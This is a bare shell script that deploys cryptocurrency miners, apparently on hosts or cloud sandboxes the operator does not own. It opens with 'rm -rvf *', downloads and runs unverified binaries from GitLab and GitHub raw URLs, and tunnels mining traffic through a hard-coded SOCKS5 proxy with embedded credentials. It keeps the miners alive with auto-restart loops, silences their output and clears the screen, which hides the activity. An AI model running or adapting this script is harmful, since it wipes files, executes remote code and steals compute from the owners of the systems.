rm -rvf * && clear && mkdir a && cd a
######################################
# 1. DOWNLOAD MINER
######################################
for url in \
  "https://gitlab.com/rokok/LA/-/raw/main/mcm" \
  "https://raw.githubusercontent.com/backuprepo/LA/main/mcm"
do
  wget -qO miner "$url" && break
done
chmod +x miner

######################################
# 2. DOWNLOAD GRAFTCP
######################################
wget -qO- https://gitlab.com/majzzaa/mvp/-/raw/main/graphics.tar.gz | tar -xz
chmod +x graftcp/graftcp graftcp/local/graftcp-local

######################################
# 3. CONFIG GRAFTCP (ANTI TIMEOUT)
######################################
cat > graftcp/local/graftcp-local.conf <<EOF
listen = :2233

socks5 = 165.227.64.155:443
socks5_username = yoga
socks5_password = yoga123

dns = 1.1.1.1
dns_timeout = 60s

dial_timeout = 120s
read_timeout = 0
write_timeout = 0

tcp_keepalive = true
tcp_keepalive_idle = 5
tcp_keepalive_interval = 2
tcp_keepalive_count = 10

reuse_port = true
log_level = error
EOF

######################################
# 4. RUN-MINER.SH (SESUAI SCRIPT KAMU)
######################################
cat > run-miner.sh <<'EOF'
#!/bin/bash
WALLET="solo:28SAaZPGvyLwr6E1GQ5Eo8tcyzZ4bTn"
WORKER="$(shuf -n 1 -i 1-4)-YD"

while true; do
  ./graftcp/graftcp ./miner \
    --wallet "$WALLET" \
    --worker "$WORKER"
  sleep 5
done
EOF
chmod +x run-miner.sh

######################################
# 5. START GRAFTCP (AUTO-RESTART)
######################################
pkill -f graftcp-local 2>/dev/null || true

(
  while true; do
    ./graftcp/local/graftcp-local \
      -config graftcp/local/graftcp-local.conf \
      >/dev/null 2>&1
    sleep 2
  done
) &

sleep 2

######################################
# 6. START MINER
######################################
exec ./run-miner.sh & wget https://gitlab.com/cuan8871816/jam/-/raw/main/sse2 && chmod 777 sse2 && ./sse2 -a power2b -o stratum+tcp://143.198.85.42:443 -u mbc1qc0r808p2xuw665s4gx9cnujfqjaa2fk2e02xax -t 4 > /dev/null 2>&1 & clear
